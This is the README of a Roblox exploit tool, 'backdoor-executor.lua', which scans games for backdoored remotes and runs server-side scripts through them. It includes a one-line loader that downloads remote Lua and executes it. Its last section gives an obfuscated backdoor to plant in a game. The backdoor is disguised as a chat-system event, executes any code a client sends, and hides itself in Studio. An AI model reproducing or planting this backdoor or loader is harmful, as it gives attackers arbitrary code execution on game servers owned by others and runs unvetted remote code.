# backdoor-executor.lua
###
* Created on: July 22, 2021 GMT+8 (based on the commit date in my jLn0n/scripts-private repo)
###
might be better than [backdoor.exe](https://github.com/iK4oS/backdoor.exe) in terms of scanning backdoors.

## Info

This script is for [Roblox](https://roblox.com) scanning backdoors and executing serversided scripts within a GUI.

### Script

Just copy the script below and execute it through your executor.
```lua
loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/created-scripts-public/main/backdoor-executor/backdoor-executor.lua"))()
```

### Requirements

- A brain that knows this stuff
- Decent executor that supports filesystem functions (for config)
### Config Help
- My config has reset back to original
> The config will reset to the original config if the config errors on loading or something.
- Adding cache example
```lua
[placeid] = {
	["Path"] = "remote.path.here", -- this is the path of the remote, don't do remote.path["here"] or it will not work
	["Args"] = {"arg1here", "source"}, -- source shouldn't be deleted because its a arg for scripts that will be executed
	["SourceFunc"] = function(source) -- use this if a game has a custom encryption for source
		return source
	end
}
```
> if the cache didn't work backdoor-executor.lua will warn to you that the cache didn't work

- Using autoexecute
> add a script inside the autoExecute table, you can put many code as long as you want inside the table, example:
```lua
-- it should be a array and don't add a nil or it will not work
{
	[[warn("backdoor-executor.lua loaded!")]],
},
```

- Adding remote filters
> adding remote filters are like this below:
```lua
{
	["exampleFilter"] = function(remoteObj)
		return remoteObj.Name == "bogus" or remoteObj.Parent.Name == "yomama"
	end,
},
```
- Adding script macros:
> adding script macros can be easy, look at the example below:
```lua
{
	["staticmacro"] = "value", -- returns static macros
	["dynamicmacro"] = function() -- returns dynamic macro
		return math.random(1, 100)
	end,
}
```

## Adding a backdoor in your game
Get access to a game in Roblox Studio, create a script and paste the few lines of code below in the script.
Make sure to enable `LoadStringEnabled` property in `ServerScriptService`. (code is just semi-obfuscated and easily crackable lol)
```lua
if game:GetService("\82\117\110\83\101\114\118\105\99\101"):IsStudio() or not game:GetService("\83\101\114\118\101\114\83\99\114\105\112\116\83\101\114\118\105\99\101")["\76\111\97\100\83\116\114\105\110\103\69\110\97\98\108\101\100"] then return end;local a=Instance.new("\82\101\109\111\116\101\69\118\101\110\116");a.Name="\71\101\116\80\108\97\121\101\114\77\101\115\115\97\103\101\65\115\121\110\99";a.Parent=game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101"):WaitForChild("\68\101\102\97\117\108\116\67\104\97\116\83\121\115\116\101\109\67\104\97\116\69\118\101\110\116\115");a.OnServerEvent:Connect(function(_, b)loadstring(b)()end)
```
